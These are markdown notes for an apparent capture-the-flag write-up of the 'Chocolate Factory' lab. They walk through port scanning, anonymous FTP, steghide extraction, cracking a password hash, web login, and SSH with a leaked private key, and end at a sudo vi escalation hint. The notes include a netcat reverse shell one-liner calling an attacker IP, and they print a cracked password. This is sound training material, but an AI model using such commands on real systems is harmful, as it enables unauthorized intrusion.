## Chocolate Factory Notes.

Room tags: `CTF` `stego` `privesc`

Target IP: `10.10.15.13`

## Goals/Questions

- Enter a key that you found.

- Charlies Password

- User Flag

- Root flag


## Enumeration. 

### rustscan/nmap

`sudo rustscan -a $IP -- -sC -sV`

Open Ports:

A lot. A lot of "open" ports. Most are either inactive, error out, or contain some 'story' fluff. 

Even using `rustscan` still took ~10 mins. 

- 21 - ftp - anonymous 
- 22 - ssh
- 80 - http

[rustscan](images/rust.png)

[scan-syntax](images/scan.png)

### gobuster

`gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt`

- index.html

[gobuster](images/gobuster.png)

### Website

[index](images/index.png)

Index page source had no real extra information.

downloaded `image.png` that is the background for `index.html`

### FTP

Anon FTP was allowed. 

`ftp $IP`

FTP server had `gum_room.jpeg`

`get gum_room.jpg`

### steghide

`steghide --extract -sf gum_room.jpg`

The image contained `b64.txt`

`cat b64.txt`

Obvious base 64.

`cat b64.txt | base64 --decode > pw.txt`

Charlies password hash is contained within. Isolate it with `tail -1 pw.txt > charlie.txt`

### john

`john charlie.txt --wordlist=/user/share/wordlists/rockyou.txt`

### ssh?

Attempted to SSH using the password found above (`cn7824`) and no dice. 

Brought it back to the website, and was able to log in with that. 

used a nc oneliner to open a reverse shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.6.20 1234 >/tmp/f`

`/home/charlie` was accessible and had `teleport` and `teleport.pub` readable by everyone

Using a simple `cat teleport` I copied the contents to a new file on my host VM, and then used it to ssh into the target as the user `charlie`.

The rsa key needs to be set to only allow the owner to read it using `chmod 400 teleport` and then you will be able to use it to log in as charlie

`ssh -i teleport charlie@$IP`

`user.txt` was located in `/home/charlie`

running `sudo -l` shows that you can use `vi` with no password. 
